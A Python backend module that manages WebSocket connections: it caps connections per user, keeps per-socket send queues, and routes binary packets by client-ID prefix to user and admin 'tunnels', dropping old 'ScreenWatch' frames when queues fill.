# backend\API\connection_manager.py
import asyncio, logs.LoggerWrapper as logger

class ConnectionManager:
    def __init__(self):
        self.active_users, self.tunnels = {}, {} # {login: [ws]}, {prefix: [ws]}
        self.queues, self.send_tasks = {}, {}    # {ws: Queue}, {ws: Task}
        self.prefix_cache = {}

    async def connect(self, websocket, login, user):
        await websocket.accept()
        
        # Если открыто 3+, отклоняем новое (четвертое) соединение
        if len(self.active_users.get(login, [])) >= 3:
            await websocket.close(code=1008)
            return False

        self.queues[websocket] = (queue := asyncio.Queue(maxsize=200))
        self.send_tasks[websocket] = asyncio.create_task(self._socket_writer(websocket, queue))
        
        self.active_users.setdefault(login, []).append(websocket)
        prefix = user.get("prefix", "NONE")
        self.tunnels.setdefault(prefix, []).append(websocket)
        if user.get("role") == "admin": self.tunnels.setdefault("ALL", []).append(websocket)
        
        logger.Log.info(f"[API] [+] {login} вошел в туннель {prefix}")
        return True

    def broadcast_packet_sync(self, packet):
        if len(packet) < 6: return
        id_len, mod_len = packet[0], packet[1]
        raw_id, module = packet[6:6+id_len], packet[6+id_len:6+id_len+mod_len]
        
        prefix = self._get_prefix(raw_id)
        targets = set(self.tunnels.get(prefix, [])) | set(self.tunnels.get("ALL", []))

        for websocket in targets:
            if not (queue := self.queues.get(websocket)): continue
            if b"ScreenWatch" in module and queue.full(): self._drop_old_frames(queue)
            try: queue.put_nowait(packet)
            except asyncio.QueueFull: pass

    async def _socket_writer(self, websocket, queue):
        try:
            while True: await websocket.send_bytes(await queue.get())
        except: pass

    def disconnect(self, websocket, login):
        if (task := self.send_tasks.pop(websocket, None)): task.cancel()
        self.queues.pop(websocket, None)
        for group in list(self.active_users.values()) + list(self.tunnels.values()):
            if websocket in group: group.remove(websocket)

    def _get_prefix(self, raw_id):
        if raw_id in self.prefix_cache: return self.prefix_cache[raw_id]
        try:
            name = (decoded := raw_id.decode(errors='ignore')).split('-')[0] if '-' in decoded else "NONE"
            return self.prefix_cache.setdefault(raw_id, name)
        except: return "NONE"

    def _drop_old_frames(self, queue):
        while queue.full():
            try: queue.get_nowait()
            except asyncio.QueueEmpty: break